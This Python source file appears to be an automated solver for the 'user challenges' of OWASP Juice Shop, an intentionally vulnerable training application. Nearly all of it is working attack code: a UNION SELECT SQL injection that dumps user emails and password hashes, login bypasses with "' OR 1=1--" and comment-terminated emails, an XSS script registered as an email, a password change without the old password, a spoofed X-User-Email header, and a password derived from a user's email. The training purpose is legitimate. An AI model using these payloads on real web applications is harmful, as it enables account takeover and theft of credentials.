from base64 import b64encode

from authentication import create_user
from authentication import get_admin_session
from authentication import get_session


def get_users(server, session):
    """
    Get user data from authentication-details endpoint
    :param server: juice shop URL
    :param session: Session
    :return: list of user objects
    """
    users = session.get('{}/rest/user/authentication-details/'.format(server))
    if not users.ok:
        raise RuntimeError('Error retrieving user info. Request status: {}'.format(users.status_code))
    return users.json().get('data')


def get_users_with_sql_injection(server):
    """
    Abuse UNION SELECT statement to join the users table to the products query, print out results.
    Also solves logging in as admin with real credentials if unsolved yet.
    :param server: juice shop URL
    """
    session = get_admin_session(server)
    #injection = "test')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM USERS--"
    injection = "test%27))%20UNION%20SELECT%20id,email,password,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20USERS--"
    users = session.get('{}/rest/products/search?q={}'.format(server, injection))
    if not users.ok:
        raise RuntimeError('Error with SQLi attempt.')
    print('Found email and password hashes with SQLi, printing...')
    for user in users.json().get('data'):
        print('Email: {}, Password hash: {}'.format(user.get('name'), user.get('description')))
    print('Done.')


def change_bender_password(server):
    """
    Abuse a CSRF flaw in the change-password endpoint that allows us to set new passwords without the old one.
    :param server: juice shop URL.
    """
    session = get_session(server, "bender@juice-sh.op'--", 'anything')
    newpass = 'slurmCl4ssic'
    changeurl = '{}/rest/user/change-password?new={newpass}&repeat={newpass}'.format(server, newpass=newpass)
    print('Changing Bender\'s password...', end=''),
    update = session.get(changeurl)
    if not update.ok:
        raise RuntimeError('Error updating Bender\'s password.')
    print('Success.')


def create_user_with_xss2_payload(server):
    """
    The UI client blocks invalid email addresses. Bypass it and create a user through the API.
    :param server: juice shop URL.
    """
    xss2 = '<script>alert("XSS2")</script>'
    print('Creating user account with malicious XSS2 as email...', end=''),
    create_user(server, xss2, 'password')
    print('Success.')


def login_all_users_with_sqli(server):
    """
    Log in as all users using SQL injection
    :param server: URL of juice shop target
    """
    session = get_session(server, "' OR 1=1--", "anything")
    users = get_users(server, session)
    print('Logging in with all available user accounts using SQLi...'),
    for user in users:
        email = "{}'--".format(user.get('email'))
        login = get_session(server, email, 'anything')
        del login
    print('Success.')


def login_as_bjoern(server):
    """
    Bypass OAuth completely by using the default password generated
    :param server: juice shop URL
    """
    bjoern = 'bjoern.kimminich@googlemail.com'
    badidea = b64encode(bjoern)
    print('Logging in as {} with autogenerated password...'.format(bjoern)),
    session = get_session(server, bjoern, badidea)
    print('Success.')
    del session


def login_as_ciso(server):
    """
    Log in as CISO by abusing the X-User-Email header usually read from a cookie
    :param server: juice shop URL
    """
    headers = {'Content-Type': 'application/json', 'X-User-Email': 'ciso@juice-sh.op'}
    print('Logging in as CISO using spoofed header and OAuth...', end=''),
    session = get_session(server, 'admin@juice-sh.op', 'admin123', headers=headers, oauth=True)
    print('Success.')
    del session


def solve_user_challenges(server):
    print('\n== USER CHALLENGES ==\n')
    #login_all_users_with_sqli(server)
    get_users_with_sql_injection(server)
    create_user_with_xss2_payload(server)
    change_bender_password(server)
    #login_as_bjoern(server)
    login_as_ciso(server)
    print('\n== END USER CHALLENGES ==\n')
